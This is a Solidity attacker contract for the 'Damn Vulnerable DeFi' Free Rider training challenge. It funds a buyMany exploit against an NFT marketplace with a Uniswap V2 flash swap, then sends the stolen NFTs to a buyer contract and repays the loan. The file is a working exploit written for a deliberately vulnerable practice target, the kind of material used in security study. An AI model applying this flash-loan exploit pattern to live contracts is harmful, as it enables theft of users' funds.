pragma solidity >=0.8.0;

import "forge-std/Test.sol";

import {FreeRiderBuyer} from "../../../src/Contracts/free-rider/FreeRiderBuyer.sol";
import {FreeRiderNFTMarketplace} from "../../../src/Contracts/free-rider/FreeRiderNFTMarketplace.sol";
import {IUniswapV2Router02, IUniswapV2Factory, IUniswapV2Pair} from "../../../src/Contracts/free-rider/Interfaces.sol";
import {DamnValuableNFT} from "../../../src/Contracts/DamnValuableNFT.sol";
import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
import {WETH9} from "../../../src/Contracts/WETH9.sol";
import {IERC721Receiver} from "openzeppelin-contracts/token/ERC721/IERC721Receiver.sol";

interface IUniswapV2Callee {
    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

contract AttackFreeRider is IUniswapV2Callee, IERC721Receiver {
    FreeRiderBuyer internal freeRiderBuyer;
    FreeRiderNFTMarketplace internal freeRiderNFTMarketplace;
    DamnValuableToken internal dvt;
    DamnValuableNFT internal damnValuableNFT;
    IUniswapV2Pair internal uniswapV2Pair;
    IUniswapV2Factory internal uniswapV2Factory;
    IUniswapV2Router02 internal uniswapV2Router;
    WETH9 internal weth;

    address factoryV2;

    uint256 immutable costOfNfts = 15 ether;

    constructor(address _pair, address _factory, address _buyer, address payable _marketplace, address payable _weth) {
        uniswapV2Pair = IUniswapV2Pair(_pair);
        factoryV2 = _factory;
        freeRiderBuyer = FreeRiderBuyer(_buyer);
        freeRiderNFTMarketplace = FreeRiderNFTMarketplace(_marketplace);
        damnValuableNFT = freeRiderNFTMarketplace.token();
        weth = WETH9(_weth);
    }

    function attack() external {
        uniswapV2Pair.swap(0, costOfNfts, address(this), "0x");
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        address token0 = IUniswapV2Pair(msg.sender).token0(); // fetch the address of token0
        address token1 = IUniswapV2Pair(msg.sender).token1(); // fetch the address of token1
        assert(msg.sender == IUniswapV2Factory(factoryV2).getPair(token0, token1)); // ensure that msg.sender is a V2 pair
        weth.withdraw(costOfNfts);

        uint256[] memory buys = new uint256[](6);
        for (uint256 i; i < buys.length;) {
            buys[i] = i;
            unchecked {
                ++i;
            }
        }
        freeRiderNFTMarketplace.buyMany{value: costOfNfts}(buys);

        for (uint256 i; i < buys.length;) {
            damnValuableNFT.safeTransferFrom(address(this), address(freeRiderBuyer), i);
            unchecked {
                ++i;
            }
        }
        uint256 tokenReturn = costOfNfts * 1000 / 997 + 1;
        weth.deposit{value: tokenReturn}();
        weth.transfer(address(uniswapV2Pair), tokenReturn);
    }

    function onERC721Received(address, address, uint256 _tokenId, bytes memory) external override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}
